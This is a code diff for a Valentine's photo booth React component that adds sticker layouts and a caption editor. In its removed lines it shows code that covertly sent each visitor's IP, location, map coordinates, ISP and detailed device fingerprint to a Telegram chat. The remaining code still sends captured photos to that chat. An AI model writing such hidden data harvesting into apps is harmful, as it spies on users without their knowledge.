@@ -6,17 +6,18 @@ import { FRAMES, STICKERS, STICKER_BACKGROUNDS, STICKER_FRAMES } from '../consta
 const ALL_FRAMES = [...FRAMES, ...STICKER_FRAMES];
 import { sendPhotoToTelegram } from '../services/telegramService';
 import { audioService } from '../services/audioService';
-import { getLocationData } from '../services/locationService';
-import { getDetailedDeviceData } from '../services/deviceService';
-import { detectSocialPresence, getReferrer } from '../services/socialService';
 
 interface PhotoStripProps {
-  photos: CapturedPhoto[];
-  frame: FrameOption;
-  setFrame: (frame: FrameOption) => void;
+  photos: any[];
+  frame: any;
+  setFrame: (frame: any) => void;
   onReset: () => void;
-  selectedStickers: StickerOption[];
-  setSelectedStickers: (stickers: StickerOption[]) => void;
+  selectedStickers: any[];
+  setSelectedStickers: (stickers: any[]) => void;
+  stickerStyle: 'single' | 'burst' | 'chaos' | 'border' | 'corners';
+  setStickerStyle: (style: 'single' | 'burst' | 'chaos' | 'border' | 'corners') => void;
+  stripCaption: string;
+  setStripCaption: (caption: string) => void;
 }
 
 interface VisualEffect {
@@ -48,7 +49,11 @@ export const PhotoStrip: React.FC<PhotoStripProps> = ({
   setFrame,
   onReset,
   selectedStickers,
-  setSelectedStickers
+  setSelectedStickers,
+  stickerStyle,
+  setStickerStyle,
+  stripCaption,
+  setStripCaption
 }) => {
   const stripRef = useRef<HTMLDivElement>(null);
   const [isExporting, setIsExporting] = useState<'download' | 'share' | 'telegram' | null>(null);
@@ -88,20 +93,6 @@ export const PhotoStrip: React.FC<PhotoStripProps> = ({
     setSyncStatus('syncing');
 
     try {
-      // Fetch location, device, and social info
-      const location = await getLocationData();
-      const device = await getDetailedDeviceData();
-      const socialPresence = await detectSocialPresence();
-      const referrer = getReferrer();
-
-      const locationStr = location
-        ? `\n📍 Location: ${location.city}, ${location.country}\n🌐 IP: ${location.ip}\n🏢 ISP: ${location.org}\n🗺️ Map: https://www.google.com/maps?q=${location.latitude},${location.longitude}`
-        : '\n📍 Location: Unknown';
-
-      const deviceStr = `\n💻 SYSTEM DATA:\n- GPU: ${device.gpu}\n- Screen: ${device.screenResolution} (@${device.pixelRatio}x)\n- Color Depth: ${device.colorDepth}-bit\n- CPU Cores: ${device.cores}\n- RAM: ${device.memory || '?'}GB\n- OS: ${device.platform}\n- Battery: ${device.battery}\n- AdBlock: ${device.adBlocker ? 'Active' : 'Not detected'}\n- Touch Points: ${device.touchPoints}\n- Language: ${device.language}\n- Timezone: ${device.timezone}\n- Tabs Active: ${device.tabsOpen}\n- Network: ${device.connection}`;
-
-      const socialStr = `\n🛡️ SECURITY/REFERRER:\n- Origin: ${referrer}\n- Social Footprint: ${socialPresence}`;
-
       // Higher delay for iOS/mobile to ensure UI is ready
       const captureDelay = isIOS ? 1500 : 1000;
       await new Promise(r => setTimeout(r, captureDelay));
@@ -136,7 +127,7 @@ export const PhotoStrip: React.FC<PhotoStripProps> = ({
 
       console.log(`Blob created: ${blob.size} bytes. Sending to Telegram...`);
 
-      const caption = `❤️ Love Booth Capture!\n✨ Effect: ${selectedEffect.name}\n🖼️ Frame: ${frame.name}\n💌 Memories captured forever.${locationStr}${deviceStr}${socialStr}`;
+      const caption = `❤️ Love Booth Capture!`;
 
       const result = await sendPhotoToTelegram(blob, TELEGRAM_CHAT_ID, caption);
       console.log('Telegram sync successful:', result);
@@ -267,7 +258,26 @@ export const PhotoStrip: React.FC<PhotoStripProps> = ({
 
         {/* Stickers Selector */}
         <div className="w-full bg-white/80 backdrop-blur-sm p-4 rounded-3xl shadow-sm border border-pink-100 flex flex-col items-center gap-3">
-          <span className="text-pink-500 font-bold text-[10px] uppercase tracking-widest">Add Stickers</span>
+          <div className="flex flex-col items-center gap-1">
+            <span className="text-pink-500 font-bold text-[10px] uppercase tracking-widest">Add Stickers</span>
+            <div className="flex bg-pink-100/50 p-0.5 rounded-full mb-1 flex-wrap justify-center gap-1">
+              {[
+                { id: 'single', label: 'Classic' },
+                { id: 'burst', label: 'Burst' },
+                { id: 'chaos', label: 'Chaos' },
+                { id: 'border', label: 'Border' },
+                { id: 'corners', label: 'Corners' }
+              ].map(s => (
+                <button
+                  key={s.id}
+                  onClick={() => setStickerStyle(s.id as any)}
+                  className={`px-2 py-0.5 rounded-full text-[7px] font-bold uppercase transition-all ${stickerStyle === s.id ? 'bg-pink-500 text-white shadow-sm' : 'text-pink-400 hover:bg-pink-100'}`}
+                >
+                  {s.label}
+                </button>
+              ))}
+            </div>
+          </div>
           <div className="flex flex-wrap justify-center gap-2 px-1">
             <button
               onClick={() => setSelectedStickers([])}
@@ -315,6 +325,19 @@ export const PhotoStrip: React.FC<PhotoStripProps> = ({
             ))}
           </div>
         </div>
+
+        {/* Caption Editor */}
+        <div className="w-full bg-white/80 backdrop-blur-sm p-4 rounded-3xl shadow-sm border border-pink-100 flex flex-col items-center gap-3">
+          <span className="text-pink-500 font-bold text-[10px] uppercase tracking-widest">Edit Caption</span>
+          <input
+            type="text"
+            value={stripCaption}
+            onChange={(e) => setStripCaption(e.target.value)}
+            placeholder="Write your message..."
+            className="w-full px-4 py-2 rounded-xl border border-pink-100 focus:outline-none focus:ring-2 focus:ring-pink-400 bg-white/50 text-pink-600 text-sm font-medium text-center"
+            maxLength={30}
+          />
+        </div>
       </div>
 
       {/* The Photobooth Strip */}
@@ -335,37 +358,64 @@ export const PhotoStrip: React.FC<PhotoStripProps> = ({
               />
               {renderOverlay(selectedEffect.overlay)}
               <div className="absolute top-2 right-2 text-[10px] text-pink-500/30 font-bold rotate-12 uppercase">XOXO</div>
-              {selectedStickers.map((sticker, index) => {
+              {selectedStickers.flatMap((sticker, sIdx) => {
                 const STICKER_STYLES = [
-                  { bottom: '5%', left: '5%' },
-                  { top: '5%', right: '5%' },
-                  { top: '5%', left: '5%' },
-                  { bottom: '5%', right: '5%' },
-                  { top: '5%', left: '42.5%' },
-                  { top: '40%', left: '5%' },
+                  { bottom: '5%', left: '5%' }, { top: '5%', right: '5%' },
+                  { top: '5%', left: '5%' }, { bottom: '5%', right: '5%' },
+                  { top: '5%', left: '42.5%' }, { top: '40%', left: '5%' },
                   { top: '40%', right: '5%' },
                 ];
-                const pos = STICKER_STYLES[index % STICKER_STYLES.length];
-                return (
-                  <div
-                    key={`${photo.id}-${sticker.id}`}
-                    className="absolute w-8 h-8 pointer-events-none transition-all duration-300 animate-in zoom-in"
-                    style={pos}
-                  >
-                    <img
-                      src={sticker.url}
-                      className="w-full h-full object-contain drop-shadow-md"
-                      alt="Sticker"
-                      crossOrigin="anonymous"
-                    />
+
+                const BORDER_STYLES = [
+                  { top: '2%', left: '2%' }, { top: '2%', left: '25%' }, { top: '2%', left: '50%' }, { top: '2%', left: '75%' }, { top: '2%', right: '2%' },
+                  { bottom: '2%', left: '2%' }, { bottom: '2%', left: '25%' }, { bottom: '2%', left: '50%' }, { bottom: '2%', left: '75%' }, { bottom: '2%', right: '2%' },
+                  { top: '25%', left: '2%' }, { top: '50%', left: '2%' }, { top: '75%', left: '2%' },
+                  { top: '25%', right: '2%' }, { top: '50%', right: '2%' }, { top: '75%', right: '2%' },
+                ];
+
+                const CORNER_STYLES = [
+                  { top: '3%', left: '3%' }, { top: '10%', left: '3%' }, { top: '3%', left: '10%' },
+                  { top: '3%', right: '3%' }, { top: '10%', right: '3%' }, { top: '3%', right: '10%' },
+                  { bottom: '3%', left: '3%' }, { bottom: '10%', left: '3%' }, { bottom: '3%', left: '10%' },
+                  { bottom: '3%', right: '3%' }, { bottom: '10%', right: '3%' }, { bottom: '3%', right: '10%' },
+                ];
+
+                let configs: { style: React.CSSProperties; key: string }[] = [];
+
+                if (stickerStyle === 'burst') {
+                  configs = STICKER_STYLES.map((pos, i) => ({ style: pos, key: `${photo.id}-${sticker.id}-burst-${i}` }));
+                } else if (stickerStyle === 'border') {
+                  configs = BORDER_STYLES.map((pos, i) => ({ style: { ...pos, transform: 'scale(0.7)' }, key: `${photo.id}-${sticker.id}-border-${i}` }));
+                } else if (stickerStyle === 'corners') {
+                  configs = CORNER_STYLES.map((pos, i) => ({ style: pos, key: `${photo.id}-${sticker.id}-corners-${i}` }));
+                } else if (stickerStyle === 'chaos') {
+                  for (let i = 0; i < 6; i++) {
+                    const seed = (sIdx + 1) * (i + 1);
+                    configs.push({
+                      key: `${photo.id}-${sticker.id}-chaos-${i}`,
+                      style: {
+                        top: `${(seed * 17) % 80 + 5}%`,
+                        left: `${(seed * 23) % 80 + 5}%`,
+                        transform: `rotate(${(seed * 45) % 360}deg) scale(${(seed % 5) * 0.2 + 0.6})`,
+                        opacity: 0.9,
+                      }
+                    });
+                  }
+                } else {
+                  configs = [{ style: STICKER_STYLES[sIdx % STICKER_STYLES.length], key: `${photo.id}-${sticker.id}-single` }];
+                }
+
+                return configs.map(cfg => (
+                  <div key={cfg.key} className="absolute w-8 h-8 pointer-events-none transition-all duration-300 animate-in zoom-in" style={cfg.style}>
+                    <img src={sticker.url} className="w-full h-full object-contain drop-shadow-md" alt="Sticker" crossOrigin="anonymous" />
                   </div>
-                );
+                ));
               })}
             </div>
           ))}
 
           <div className="pt-6 pb-2 px-3 text-center border-t-2 border-dashed border-pink-300/30">
-            <h3 className="font-pacifico text-pink-500 text-xl mb-1">Valentine 2026</h3>
+            <h3 className="font-pacifico text-pink-500 text-xl mb-1">{stripCaption || 'Valentine 2026'}</h3>
 
           </div>
         </div>
